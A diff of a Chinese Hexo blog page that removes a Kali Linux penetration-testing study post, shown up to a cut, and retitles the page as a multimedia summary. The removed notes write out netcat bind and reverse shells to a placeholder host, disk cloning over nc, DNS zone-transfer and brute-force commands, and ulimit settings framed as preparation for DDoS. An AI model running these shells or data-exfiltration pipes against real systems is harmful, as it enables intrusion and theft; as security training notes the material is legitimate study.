@@ -6,15 +6,11 @@
 
 <head><meta name="generator" content="Hexo 3.9.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="kali, 渗透测试,C,SQL注入,XSS注入,文件上传漏洞等">
+    <meta name="keywords" content="多媒体总结, 渗透测试,C,SQL注入,XSS注入,文件上传漏洞等">
     <meta name="baidu-site-verification" content="fmlEuI34ir">
     <meta name="google-site-verification" content="KeoTn_OFy4ndJwXNmm2gMeQfPhd7alqE9vQDwI32KCY">
-    <meta name="description" content="Kali Linux（安全牛学习）渗透测试准备基础静态IP配置修改文件/etc/network/interface
-allow-htoplug eth0
-
-iface eht0 inet static
-
-address 192.168.0.">
+    <meta name="description" content="网络多媒体第一部分：基础级一、基本概念1.媒体的类型：感觉媒体：感觉媒体是指直接作用于人们的感觉器官，从而能使人产生直接感觉的媒体。感觉媒体包括人类的语言、音乐和自然界的各种声音、活动图像、图形、动画及文本等。
+表示媒体：表示媒体是指为了传">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -22,7 +18,7 @@ address 192.168.0.">
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>kali | Dusk</title>
+    <title>多媒体总结 | Dusk</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -474,13 +470,13 @@ address 192.168.0.">
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/3.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/19.jpg')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        kali
+                        多媒体总结
                     </div>
                 </div>
             </div>
@@ -592,8 +588,8 @@ address 192.168.0.">
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/kali/" target="_blank">
-                                <span class="chip bg-color">kali</span>
+                            <a href="/tags/网络多媒体/" target="_blank">
+                                <span class="chip bg-color">网络多媒体</span>
                             </a>
                         
                     </div>
@@ -604,8 +600,8 @@ address 192.168.0.">
                     <div class="post-cate">
                         <i class="fa fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/kali/" class="post-category" target="_blank">
-                                kali
+                            <a href="/categories/网络多媒体/" class="post-category" target="_blank">
+                                网络多媒体
                             </a>
                         
                     </div>
@@ -616,7 +612,7 @@ address 192.168.0.">
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-08-18
+                    2020-09-06
                 </div>
 
                 <div class="post-author info-break-policy">
@@ -630,14 +626,14 @@ address 192.168.0.">
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        4.1k
+                        4.2k
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        18 分
+                        15 分
                     </div>
                     
                 
@@ -654,369 +650,232 @@ address 192.168.0.">
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="Kali-Linux（安全牛学习）"><a href="#Kali-Linux（安全牛学习）" class="headerlink" title="Kali Linux（安全牛学习）"></a>Kali Linux（安全牛学习）</h1><h2 id="渗透测试准备基础"><a href="#渗透测试准备基础" class="headerlink" title="渗透测试准备基础"></a>渗透测试准备基础</h2><h3 id="静态IP配置"><a href="#静态IP配置" class="headerlink" title="静态IP配置"></a>静态IP配置</h3><p>修改文件/etc/network/interface</p>
-<pre><code>allow-htoplug eth0
-
-iface eht0 inet static
-
-address 192.168.0.1
-
-netmask 255.255.255.0
-
-gateway 192.168.0.254
-dns-nameservers 192.168.0.10 192.168.0.20</code></pre><h3 id="更新升级"><a href="#更新升级" class="headerlink" title="更新升级"></a>更新升级</h3><p>因为kali linux经常更新软件包，所以需要时刻保持系统是最新版的</p>
-<p>更新系统的命令是</p>
-<pre><code>#apt-get update     #更新软件包的索引文件
-如果更新索引文件出现异常则用下面的命令
-#apt-get update --fix-missing
-
-#apt-get upgrade    #更新软件包文件</code></pre><p>更改软件包的更新源<br>科技大学更新源</p>
-<pre><code>deb http://mirrors.ustc.edu.cn/kali kali main non-free contrib
-deb-src http://mirrors.ustc.edc.cn/kali kali main non-free contrib
-deb http://mirrors.ustc.edu.cn/kali-security kali/updates main contrib non-free</code></pre><p>版本更新</p>
-<pre><code>#apt-get dis-upgrade</code></pre><p>重复执行</p>
-<h3 id="安装软件包"><a href="#安装软件包" class="headerlink" title="安装软件包"></a>安装软件包</h3><pre><code>#apt-get install smplayer ibus ibus-pinyin flashplugin-nonfree gdebi amule qbittorrent geany stardict meld fff-way -microhei kchmviewer freemind netspeed mtr filezilla filezilla-common chromium monodevelop mono-gmcs -y</code></pre><p>图形化软件安装包程序</p>
-<pre><code>#dpkg -i asd.deb</code></pre><h3 id="浏览器插件"><a href="#浏览器插件" class="headerlink" title="浏览器插件"></a>浏览器插件</h3><p>安装浏览器插件是为了以后的web渗透所准备的</p>
-<p>Firefox浏览器插件</p>
-<p>flashgot、autoproxy、Tamper Data、cookie importer、Cookies Manager、User Agent Switcher、HackBar、Live http header、Firebug、Download YouTube Videos as MP4、Flagfox、hashr</p>
-<p> 安装方法</p>
-<p>打开浏览器按ALT键打开菜单，下拉Tools，点击addons，然后搜索即可。</p>
-<p>SQL inject Me和XSS Me 通过以下两个网址安装，直接download即可。</p>
-<p><a href="https://addons.mozilla.org/en-US/firefox/addon/xss-me/" target="_blank" rel="noopener">https://addons.mozilla.org/en-US/firefox/addon/xss-me/</a></p>
-<p><a href="https://addons.mozilla.org/en-US/firefox/addon/sql-inject-me/$src=ss" target="_blank" rel="noopener">https://addons.mozilla.org/en-US/firefox/addon/sql-inject-me/$src=ss</a></p>
-<h3 id="安装JAVA"><a href="#安装JAVA" class="headerlink" title="安装JAVA"></a>安装JAVA</h3><p>下载安装包</p>
-<p><a href="http://java.sun.com/javase/downloads/index.jsp" target="_blank" rel="noopener">http://java.sun.com/javase/downloads/index.jsp</a></p>
-<p>解压安装包  tar -zxvf ############ ，然后将解压出来的目录移动到/usr/bin目录下#mv jdk1.8.0_45 /usr/bin，#cd /usr/bin/jdk1.8.0_45然后安装注册</p>
-<pre><code>#update-alternatives --install /usr/bin/java java /opt/jdk1.8.0_45/bin/java 1
-#update-alternatives --install /usr/bin/javac javac /opt/jdk1.8.0_45/bin/javac 1
-#update-alternatives --install /usr/lib/mozilla/plugins/libjavaplugin.so mozilla-javaplugin.so /opt/jdk1.8.0_45/jre/lib/amd64/linpjp2.so 1</code></pre><p>使注册默认生效（默认设置）</p>
-<pre><code>#update-alternatives --set java /opt/jdk1.8.0_45/bin/java
-#update-alternatives --set javac /opt/jdk1.8.0_45/bin/javac
-#update-alternatives --set mozilla-javaplugin.so /opt/jdk1.8.0_45/jre/lib/amd64/libnpjp2.so</code></pre><p>验证</p>
-<pre><code>#java -version</code></pre><p>在<a href="http://www.java.com/en/download/installed.jsp验证java安装是否完成。" target="_blank" rel="noopener">http://www.java.com/en/download/installed.jsp验证java安装是否完成。</a></p>
-<p>方法2：</p>
-<p>​    将文件夹放在/opt目录下，修改文件/etc/profile，在底部加上以下内容</p>
-<pre><code>JAVA_HOME=/opt/jdk1.8.0_131　　　#把值修改成自己的路径
-CLASSPATH=.:$JAVA_HOME/lib.tools.jar
-PATH=$JAVA_HOME/bin:$PATH
-export JAVA_HOME CLASSPATH PATH</code></pre><p>然后更新一下#source /etc/profile</p>
-<h3 id="安装显卡驱动"><a href="#安装显卡驱动" class="headerlink" title="安装显卡驱动"></a>安装显卡驱动</h3><p>GPU的用途        Nvidia         Ati</p>
-<p>显卡有上千核，可以很有效的进行一些暴力破解</p>
-<p>NVIDIA显卡驱动安装</p>
-<pre><code>#apt-get update
-#apt-get dist-upgrade
-#apt-get install -y linux-headers-$(uname -r)
-#apt-get install nvidia-kernel-dkms
-#sed 's/quiet/quiet nouveau.modeset=0/g' -i /etc/default/grub
-#update-grub
-#reboot
-验证
-#glxinfo | grep -i "direct rendering"
-显示yes即成功</code></pre><h3 id="无线网卡补丁"><a href="#无线网卡补丁" class="headerlink" title="无线网卡补丁"></a>无线网卡补丁</h3><p>最新版内核已经集成无线驱动补丁</p>
-<pre><code>#uname -a      #查看内核版本</code></pre><p>如果是老版本内核</p>
-<pre><code>#cd /usr/src/
-#wget https://www.kernel.org/pub/linux/kernel/projects/backports/stable/v3.12/backports-3.12-1.tar.bz2     #下载版本视内核情况而定
-#tar xvf backports-3.12-1.tar.bz2
-#cd backports-3.12-1
-#apt-get install patch
-#wegt http://patches.aircrack-ng.org/mac80211.compat08082009.wl_frag+ack_vl.patch
-#patch -pl&lt;mac80211.compat08082009.wl_frag+ack_vl.patch&gt;
-#apt-get install libncurses5-dev
-#airmon-ng          #查看驱动
-#make defconfig-ath9k
-#make &amp;&amp; make install</code></pre><h3 id="并发线程限制"><a href="#并发线程限制" class="headerlink" title="并发线程限制"></a>并发线程限制</h3><p>为以后DDoS攻击做准备</p>
-<p>Ulimite用于限制<strong>当前</strong>shell内进程的资源使用</p>
-<p>查看默认值</p>
-<pre><code>#ulimit -a</code></pre><h4 id="用途距离"><a href="#用途距离" class="headerlink" title="用途距离"></a>用途距离</h4><p>​    ·限制 堆栈大小：#ulimit -s 100</p>
-<p>​    ·限制shell内存使用：#ulimit -m 5000 -v 5000</p>
-<p>修改root家目录下的.bashrc文件可以永久生效</p>
-<p>通过修改open files即#ulimit -n 90000000 来为之后的DDoS需要打开的文件做上限修改</p>
-<h3 id="电源优化"><a href="#电源优化" class="headerlink" title="电源优化"></a>电源优化</h3><p>·渗透测试系统耗电较大</p>
-<p>·延长电池寿命</p>
-<pre><code> ·无操作挂起、关闭显示器</code></pre><p>​     ·降低显示器亮度</p>
-<p>​     ·不使用时关闭无线网卡</p>
-<p>​     ·开启硬盘省电选项</p>
-<pre><code>#hdparm -i /dev/sda if AdvancedPM=yes then hdparm -B 1 -S 12 /dev/sda</code></pre><p> ·启动笔记本模式</p>
-<pre><code>笔记本模式脚本
-#!/bin/bash
-currrrentMode=$(cat /proc/sysvm/laptop_mode)
-if[$currentMode -eq 0]
-then
-echo "5" &gt; /proc/sys/vm/laptop_mode
-echo "Laptop Mode Enabled"
-else
-echo "0" &gt; /proc/sys/vm/laptop_mode
-echo "Laptop Mode Disabled"
-fi</code></pre><h3 id="服务开关"><a href="#服务开关" class="headerlink" title="服务开关"></a>服务开关</h3><p>kali linux默认未启动所有网络服务</p>
-<p>临时开启网络服务</p>
-<pre><code>#/etc/init.d/ssh start</code></pre><p>永久开启网络服务</p>
-<pre><code>#update-rc.d ssh default
-#update-rc.d ssh start 20 2 3 4 5 .stop 20 0 1 6 .
-运行级别0-6
-#update-rc.d A defaults 80 20     #80是启动优先级，20是关闭优先级
-#update-rc.d B defaults 90 10     #数值越大优先级越小</code></pre><h3 id="翻墙-amp-代理"><a href="#翻墙-amp-代理" class="headerlink" title="翻墙&amp;代理"></a>翻墙&amp;代理</h3><h4 id="GFW长城防火墙"><a href="#GFW长城防火墙" class="headerlink" title="GFW长城防火墙"></a>GFW长城防火墙</h4><p>​    ·Facebook、YouTube    </p>
-<h4 id="翻墙"><a href="#翻墙" class="headerlink" title="翻墙"></a>翻墙</h4><p>​    ·http代理        http是一个明文传输的协议容易被GFW所发现，他会更新自己的策略库来阻挡用户。但是可以用https对传输来进行加密。</p>
-<p>​    ·socks代理</p>
-<p>​    ·ssh隧道</p>
-<p>​    ·VPN</p>
-<h4 id="翻墙软件"><a href="#翻墙软件" class="headerlink" title="翻墙软件"></a>翻墙软件</h4><p>​    ·Goagent （现在已经GoAgent已经成为过去式了）</p>
-<p>​        下载网址：<a href="https://cod.gode.google.com/p/goagent/或者https://github.com/goagent/goagent" target="_blank" rel="noopener">https://cod.gode.google.com/p/goagent/或者https://github.com/goagent/goagent</a>            </p>
-<p>​            ·注册：appengine.google.com</p>
-<p>​            过程：IE→goagent→GAE→目标网站</p>
-<p>ip138.com可以查看自己的公网地址</p>
-<p>​    ·<strong>Tor</strong>                <strong>暗网</strong></p>
-<h4 id="代理的意义所在"><a href="#代理的意义所在" class="headerlink" title="代理的意义所在"></a>代理的意义所在</h4><p>​    ·加密通信</p>
-<p>​    ·隐藏来源</p>
-<p>​    ·突破网络封锁</p>
-<h4 id="GOAGENT安装"><a href="#GOAGENT安装" class="headerlink" title="GOAGENT安装"></a>GOAGENT安装</h4><p>在kali linux系统下</p>
-<p>​    ·依赖数据包</p>
-<pre><code>#apt-get install python-dev python-greenlet python-gevent python-vte python-openssl python-crypto python-appindicator python-pip libnss3-lools
-</code></pre><pre><code>#pip install pyOpenSSL
-#pip install gevent --upgrade
-#mkdir -p ~/.pki/nssdb
-#certutil -d sql:$HOME/.pki/nssdb -N  #提示输入密码，两次回车，什么也不输入
-</code></pre><h5 id="配置浏览器"><a href="#配置浏览器" class="headerlink" title="配置浏览器"></a>配置浏览器</h5><p>配置证书：打开浏览器，按ALT键，下拉Edit，点击Preferences，点击Advanced，再点击Certificates，再点击View Certificates，选择到Authorities，点击import，找到Agent文件夹里面的CA.crt，然后三个信任勾选，一直OK即可。</p>
-<p>安装了add-ons插件之后，浏览器上方会有一个<strong>福</strong>字，点击福字右边的下拉，选择首选项，选择代理服务器，选择编辑代理服务器，里面有GoAgent即可。再点击下拉框点击默认代理，选择GoAgent。点击下拉框选择全局模式。</p>
-<p>运行GoAgent，查看，显示白字都没问题，即可使用。</p>
-<h3 id="TOR"><a href="#TOR" class="headerlink" title="TOR"></a>TOR</h3><p>保护隐私防止被追踪</p>
-<p>志愿者组成的网络中转节点</p>
-<p>暗网</p>
-<p>​    ·互联网搜索引擎无法发现</p>
-<p>​    ·互联网黑市</p>
-<p>下载和看视频是不道德的行为</p>
-<p>下载：<a href="https://www.torproject.org/download/download-easy.html.en#linux" target="_blank" rel="noopener">https://www.torproject.org/download/download-easy.html.en#linux</a>     </p>
-<p>​            需要翻墙</p>
-<p>​    ·问题1：should not be run as root；</p>
-<p>​    ·问题2：服务启动错误</p>
-<p>暗网wiki</p>
-<p>​    ·<a href="http://zpktlwi4fecvo6ri.onion/wiki/index.php/Main_Page" target="_blank" rel="noopener">http://zpktlwi4fecvo6ri.onion/wiki/index.php/Main_Page</a></p>
-<p>暗网里的网站都是以onion为域名</p>
-<p>下载好软件包，进入文件夹，点击Tor Browser Setup，会报错，进入Browser目录，找到start-tor-browser，编辑它，搜索root，找到一行关于报错判断的语句，把判断eq后面的0改为任何数字，保存即可。但是会有另一个错误，是权限造成的，修改文件夹的所有者和所有组为root，#chown  R root:root tor-browser_zh-CN，双击即可运行，点击连接是无法连接成功的，点击配置，ISP是否对Tor进行了封锁选择<strong>是</strong>，然后下一步，使用集成的网桥进行连接，选择meek-azure或meek-google或者meek-amazon都可以，这一步是选择云，下一步，是否需要本地代理访问互联网，选择否，点击连接。</p>
-<p>使用Tor的集成浏览器，最大化Tor Browser窗口之后，网站可获取显示器尺寸信息，从而可跟踪用户。</p>
-<p>可以通过#netstat -pantu | grep tor    来查看后台客户端tor在侦听的端口。</p>
-<h4 id="代理设置"><a href="#代理设置" class="headerlink" title="代理设置"></a>代理设置</h4><p>可以修改apt-get的配置文件，使apt-get update 更新时使用代理来访问国外的源。</p>
-<pre><code>#vi /etc/apt/apt.conf
-    Acquire::http::Proxy"http://127.0.0.1:8087";
-
-    也可以加入以下配置
-    Acquire::ftp::Proxy"ftp://127.0.0.1:8087/";
-    Acquire::https::Proxy"ftp://127.0.0.1:8087/";
-    Acquire::socks::Proxy"ftp://127.0.0.1:8087/";
-</code></pre><p>编辑/etc/bash.bashrc可以使命令也可以用代理，如下：</p>
-<pre><code>#vi /etc/bash.bashrc
-    export http_proxy="http://127.0.0.1:8087"
-</code></pre><p>可以使用curl 加一个网页来验证是否代理</p>
-<h4 id="代理链"><a href="#代理链" class="headerlink" title="代理链"></a>代理链</h4><p>通过编辑/etc/proxychains.conf  可以进行动态代理，静态代理和随机代理</p>
-<h3 id="实验环境搭建"><a href="#实验环境搭建" class="headerlink" title="实验环境搭建"></a>实验环境搭建</h3><p>微软最新版软件</p>
-<p>​    <a href="http://msdn.microsoft.com/en-ca/subscriptions/aa336858" target="_blank" rel="noopener">http://msdn.microsoft.com/en-ca/subscriptions/aa336858</a></p>
-<p>windows虚拟机</p>
-<p>​    <a href="http://dev.modern.ie/tools/vms/" target="_blank" rel="noopener">http://dev.modern.ie/tools/vms/</a></p>
-<p>安装自己的虚拟机</p>
-<p>​    xp；win7；2003</p>
-<p>linux虚拟机</p>
-<p>​    <a href="http://www.turnkeylinux.org" target="_blank" rel="noopener">http://www.turnkeylinux.org</a></p>
-<p>​    Ubuntu</p>
-<p>​        Lamp安装</p>
-<p>Metasploitable2</p>
-<p>​    <a href="http://downloads.metasploit.com/data/metasploitable/metasploitable-linux-2.0.0.zip" target="_blank" rel="noopener">http://downloads.metasploit.com/data/metasploitable/metasploitable-linux-2.0.0.zip</a></p>
-<p>​    问题：/var/www/mutillidae/config.inc</p>
-<p>​        dbname=owasp10</p>
-<br>
-
-<h2 id="渗透工具"><a href="#渗透工具" class="headerlink" title="渗透工具"></a>渗透工具</h2><h3 id="基本工具"><a href="#基本工具" class="headerlink" title="基本工具"></a>基本工具</h3><h4 id="NETCAT——NC"><a href="#NETCAT——NC" class="headerlink" title="NETCAT——NC"></a>NETCAT——NC</h4><h5 id="功能"><a href="#功能" class="headerlink" title="功能"></a>功能</h5><p>​    可以取代Telnet/获取banner信息</p>
-<p>​    网络工具中的瑞士军刀——小身材、大智慧</p>
-<p>​    侦听模式/传输模式</p>
-<p>​    传输文本信息</p>
-<p>​    传输文件/目录</p>
-<p>​    加密传输文件</p>
-<p>​    远程控制/木马</p>
-<p>​    加密所有流量</p>
-<p>​    流媒体服务器</p>
-<p>​    远程克隆硬盘</p>
-<h5 id="TELNET-BANNER"><a href="#TELNET-BANNER" class="headerlink" title="TELNET/BANNER"></a>TELNET/BANNER</h5><p>​    nc -nv 1.1.1.1 110        </p>
-<p>​    nc -nv 1.1.1.1 25            SMTP</p>
-<p>​    nc -nv 1.1.1.1 80            Web</p>
-<p>​    nc -h       可以查看nc可用参数</p>
-<h5 id="传输文本信息"><a href="#传输文本信息" class="headerlink" title="传输文本信息"></a>传输文本信息</h5><p>​    A：nc -l -p 4444        -p是指定端口号；两个电脑要相互通信需要开放一个端口</p>
-<p>​    B：nc -nv 1.1.1.1 4444        1.1.1.1是电脑A的ip地址</p>
-<p>连接成功后两台电脑就可以聊天了</p>
-<p>电子取证</p>
-<p>​    在电脑B上输入#ls -l | nc -nv 1.1.1.1 4444  会在电脑A上显示结果，而电脑B上不会显示；在电脑A上输入#nc -l -p 4444 &gt; ps.txt 从外来的显示内容会存储在ps.txt</p>
-<p>传输文件</p>
-<p>​    A：nc -lp 333 &gt; 1.mp4                    A在这里是文件的接收端</p>
-<p>​    B：nc -nv 1.1.1.1 333 &lt; 1.mp4 -q 1                    -q 1：的意思是传输之后一秒后断开</p>
-<p>​    或者</p>
-<p>​    A：nc -q 1 -lp 333 &lt; a.mp4 -q 1            把a.mp4这个文件放在333端口里等别人来连接</p>
-<p>​            A在这里是文件的发送端</p>
-<p>​    B： nc -nv 1.1.1.1 333 &gt; b.mp4</p>
-<p>传输目录</p>
-<p>​    A：tar -cvf  -  music/  |  nc -lp 333 -q 1</p>
-<p>​    B： nc -nv 1.1.1.1 333  | tar -xvf -</p>
-<p>加密传文件</p>
-<p>​    A：nc -lp 333 | mcrypt –flush -Fbqd -a rijndael-256 -m ecb &gt; 1.mp4            这里A是接收端</p>
-<p>​    B：mcrypt –flush -Fbq -a rijndael-256 -m ecb &lt; a.mp4 | nc -nv 1.1.1.1 333 -q 1</p>
-<p>​            因为要加密所以运行命令后需要输入两次密码</p>
-<p>​            在B端进行文件的加密在A端进行解密</p>
-<h5 id="流媒体服务"><a href="#流媒体服务" class="headerlink" title="流媒体服务"></a>流媒体服务</h5><p>​    A：cat 1.mp4 | nc -lp 333</p>
-<p>​    B：nc -nv  1.1.1.1 333 | mplayer -vo x11 -cache 3000 -</p>
-<p>​        从A端流过来多少媒体，B端就播放多少</p>
-<h5 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h5><p>​    nc -nvz 1.1.1.1 1-65535                -z：扫描模式  zero-I/O</p>
-<p>​    nc -vnzu 1.1.1.1 1-1024                -u：探测UDP端口</p>
-<p>默认情况下nc是使用TCP进行探测的</p>
-<h5 id="远程克隆硬盘"><a href="#远程克隆硬盘" class="headerlink" title="远程克隆硬盘"></a>远程克隆硬盘</h5><p>​    A：nc -lp 333 | dd of =/dev/sda</p>
-<p>​    B： dd if =/dev/sda | nc -nv 1.1.1.1 333 -q 1</p>
-<p>​    远程电子取证，可以将目标服务器硬盘远程复制，或者内存。</p>
-<h5 id="远程控制"><a href="#远程控制" class="headerlink" title="远程控制"></a>远程控制</h5><p>​    正向：    </p>
-<p>​        A：nc -lp 333 -c bash</p>
-<p>​        B：nc -nv 1.1.1.1 333            这里B机是控制端，A是被控制端</p>
-<p>​    反向：</p>
-<p>​        A：nc -lp 333                        这里A机是控制端，B是被控制端</p>
-<p>​        B：nc -nv  1.1.1.1 333 -c bash</p>
-<p>​    Windows用户bash改成cmd</p>
-<h5 id="NCAT"><a href="#NCAT" class="headerlink" title="NCAT"></a>NCAT</h5><p>​    缺点：</p>
-<p>​            Nc缺乏加密和身份验证的能力</p>
-<p>​    Ncat包含于nmap工具包中，是为了弥补nc无法加密的缺点而生成的</p>
-<p>​    A：ncat -c bash  –allow 192.168.20.14 -vnl 333 –ssl        这里A是被控端</p>
-<p>​    B：ncat -nv 1.1.1.1 333 –ssl                192.168.20.14是B的IP</p>
-<p>​    不同系统/平台的nc参数功能不尽相同</p>
-<p>​        nc所有的操作ncat都可以实现</p>
-<h4 id="WIRESHARK"><a href="#WIRESHARK" class="headerlink" title="WIRESHARK"></a>WIRESHARK</h4><p>​    抓包嗅探协议分析</p>
-<p>​    安全专家必备的技能</p>
-<p>​    抓包引擎</p>
-<p>​        Libpcap9——linux</p>
-<p>​        Winpcap10——Windows</p>
-<p>​    解码能力</p>
-<h5 id="筛选器"><a href="#筛选器" class="headerlink" title="筛选器"></a>筛选器</h5><p>​    过滤掉干扰的数据包</p>
-<p>​    抓包筛选器</p>
-<p>​    显示筛选器</p>
-<p>企业抓包部署方案</p>
-<p>​    Sniffer</p>
-<p>​    Cace/riverbed</p>
-<p>​    Casecad pilot    </p>
-<h4 id="TCPDUMP——抓包"><a href="#TCPDUMP——抓包" class="headerlink" title="TCPDUMP——抓包"></a>TCPDUMP——抓包</h4><p>​    tcpdump -h：可以查看有哪些参数</p>
-<p>​    -i：指定网卡</p>
-<p>​    -w：抓包的信息存储为一个文件，一般文件名用.pcap结尾</p>
-<p>​    -r：即read，显示文件内容</p>
-<p>​    -X：按照16进制来显示</p>
-<h5 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h5><p>​    默认只抓68个字节</p>
-<p>​    tcpdump -i eth0 -s 0 -w file.pcap</p>
-<p>​    tcpdump -i eth0 port 22</p>
-<h5 id="读取抓包文件"><a href="#读取抓包文件" class="headerlink" title="读取抓包文件"></a>读取抓包文件</h5><p>​    tcpdump -r file.pcap    </p>
-<h5 id="筛选"><a href="#筛选" class="headerlink" title="筛选"></a>筛选</h5><p>​    tcpdump -n -r http.cap | awk ‘{print $3}’ | sort -u</p>
-<p>​    tcpdump -n src host 145.254.160.237    -r http.cap</p>
-<p>​    tcpdump -n dst host 145.254.160.237 -r http.cap</p>
-<p>​    tcpdump -n port 53 -r http.cap</p>
-<p>​    tcpdimp -nX port 80 -r http.cap</p>
-<h5 id="高级筛选"><a href="#高级筛选" class="headerlink" title="高级筛选"></a>高级筛选</h5><p>tcpdump -A -n ‘tcp[13]=24’ -r http.cap</p>
-<p>显示tcp包第14个字节换算是24的数据包</p>
-<h5 id="过程文档记录"><a href="#过程文档记录" class="headerlink" title="过程文档记录"></a>过程文档记录</h5><p>Dradis</p>
-<p>​    ·短期临时小团队资源共享</p>
-<p>​    ·各种插件导入文件</p>
-<p>Keepnote</p>
-<p>Truecrypt                这是一个加密工具，但是已经不再更新了</p>
-<p>​    在kali的附件里面可以找到</p>
-<p>​    里面有一个选项：假如有人指着你的头，让你输入密码，你可以输入另一个密码，然后打开的是一个空的卷，这个卷是外部的卷，真正的文件在一个隐藏的地方，即隐藏的卷。</p>
-<h2 id="被动信息收集"><a href="#被动信息收集" class="headerlink" title="被动信息收集"></a>被动信息收集</h2><p>被动信息收集就是通过公开渠道可获得的信息</p>
-<p>与目标系统不产生直接交互；</p>
-<p>尽量避免留下一切痕迹；</p>
-<p>OSINT：</p>
-<p>​    美国军方：<a href="http://www.fas.org/irp/dodair/army/atp2-22.9.pdf" target="_blank" rel="noopener">http://www.fas.org/irp/dodair/army/atp2-22.9.pdf</a></p>
-<p>​    北大西洋公约组织：<a href="http://information-retrie.info/docs/NATO-OSINT.html" target="_blank" rel="noopener">http://information-retrie.info/docs/NATO-OSINT.html</a></p>
-<h3 id="信息收集内容："><a href="#信息收集内容：" class="headerlink" title="信息收集内容："></a>信息收集内容：</h3><p>IP地址段；</p>
-<p>域名信息；</p>
-<p>邮箱地址；</p>
-<p>文档图片数据；</p>
-<p>公司地址；</p>
-<p>公司组织架构；</p>
-<p>联系电话/传真号码；</p>
-<p>人员姓名/职务；</p>
-<p>目标系统是用的技术架构；</p>
-<p>公开的商业信息。</p>
-<h3 id="信息用途"><a href="#信息用途" class="headerlink" title="信息用途"></a>信息用途</h3><p>用信息描述目标；</p>
-<p>发现目标系统；</p>
-<p>社会工程学攻击；</p>
-<p>物理缺口。0</p>
-<h3 id="信息收集——DNS"><a href="#信息收集——DNS" class="headerlink" title="信息收集——DNS"></a>信息收集——DNS</h3><p>域名解析成IP地址</p>
-<p>域名与FQDN的区别</p>
-<p>​    例：域名：baidu.com；FQDN：<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a></p>
-<p>域名记录：A、Cnmae、NS、MX、ptr</p>
-<p>​    NS：域名服务器地址记录；</p>
-<p>​    MX：邮箱服务器地址记录；</p>
-<p>​    ptr：通过IP反向解析为域名记录</p>
-<h4 id="DNS信息收集——NSLooKup"><a href="#DNS信息收集——NSLooKup" class="headerlink" title="DNS信息收集——NSLooKup"></a>DNS信息收集——NSLooKup</h4><pre><code>例：
-nslookup www.sina.com
-set type=mx        #设定只查MX记录
-set    type=a        #设定只查a记录
-set    a=any        #查询任何类型
-server    2020.106.0.20    #可以更换域名服务器地址</code></pre><p>type可以用q代替</p>
-<h3 id="信息收集——DIG"><a href="#信息收集——DIG" class="headerlink" title="信息收集——DIG"></a>信息收集——DIG</h3><p>例：</p>
-<pre><code>dig @8.8.8.8 www.sina.com MX
-
-dig www.sina.com any
-
-反向查询：
-dig +noall +answer -x 192.168.0.0
-
-bind版本信息：
-dig + noall+answer txt chaos VERSION.BIND  @ ns3.dnsv4.com
-
-DNS追踪：
-dig +trace example.com</code></pre><h4 id="DNS区域传输"><a href="#DNS区域传输" class="headerlink" title="DNS区域传输"></a>DNS区域传输</h4><p>如过目标DNS服务器配置有问题，那么通过区域传输可以得到目标的所有记录</p>
-<pre><code>dig @ns1.example.com example.com axfr
-host -T -l sina.com ns3.sina.com</code></pre><h4 id="DNS字典爆破"><a href="#DNS字典爆破" class="headerlink" title="DNS字典爆破"></a>DNS字典爆破</h4><p>如果目标不允许区域传输，为了得到更多的DNS记录就用DNS字典爆破。</p>
-<p>掌握以下一种工具即可，然后将其他工具中自带的字典集，放在一起</p>
-<p>一、fierce</p>
-<pre><code>fierce -dnsserver 8.8.8.8 -dns sina.com.cn -worldlist a.txt        #-worldlist就是指定字典文件
-dpkg -L fierce                    #查找fierce软件相关的文件，在这里可以找到这个软件的字典文件
-/usr/share/fierce/hosts.txt     #应该就是他的字典文件</code></pre><p>二、dnsdict6</p>
-<pre><code>dnsdict6 -d4 -t 16 -x sina.com        #-t是指定线程数    -x是指定什么级别的字典
-dnsdict6 -h                         #此命令可以查看选项</code></pre><p>三、dnsenum</p>
-<pre><code>dnsenum -f dnsbig.txt -dnsserver 8.8.8.8 sina.com -o sina.xml    #-o可以指定导出文件，-f指定字典文件
-find / -name dnsenum            #此命令用于查找字典文件位置和dpkg差不多</code></pre><p>四、dnsmap</p>
-<pre><code>dnsmap sina.com -w dns.txt        #-w指定字典文件</code></pre><p>五、dnsrecon</p>
-<pre><code>dnsrecon -d sina.com --lifetime 10 -t brt -D namelist.txt        #-t指定查询强度</code></pre><h3 id="DNS注册信息"><a href="#DNS注册信息" class="headerlink" title="DNS注册信息"></a>DNS注册信息</h3><p>whois工具</p>
-<pre><code>whois -h whois.apnic.net sina.com        #-h是指定whois工具网站</code></pre><table>
